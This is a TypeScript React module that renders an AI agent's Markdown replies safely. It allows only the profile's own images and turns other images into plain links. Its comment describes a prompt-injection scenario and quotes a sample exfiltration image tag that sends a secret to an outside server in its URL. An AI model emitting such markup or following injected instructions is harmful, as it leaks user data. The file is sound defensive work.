import { createElement, type ComponentProps } from 'react';
import type { Components } from 'react-markdown';

/** What the agent writes is shown as Markdown, and the agent reads web pages and files that may tell it what to write. So nothing
 * in a reply is fetched on its own: an image is drawn only when it is one of the profile's own (`/images/<profile>/<name>`), and
 * any other is shown as a link, which goes nowhere until it is clicked. `![](https://elsewhere/p.png?d=SECRET)` would otherwise
 * hand whatever is in its address to that server the moment the reply is drawn. Links open in a new tab that knows nothing of
 * this one; react-markdown itself drops addresses that run script. */
const PROFILE_IMAGE = /^\/images\/[^/]+\/[0-9a-f]{16}$/;
const link = (props: ComponentProps<'a'>) => createElement('a', { ...props, target: '_blank', rel: 'noreferrer noopener' });
export const safe = {
  a: ({ node: _, ...props }) => link(props),
  img: ({ node: _, src, alt, title }) => typeof src === 'string' && PROFILE_IMAGE.test(src) ? createElement('img', { src, alt, title }) : link({ href: src, title, children: alt || src }),
} satisfies Components;
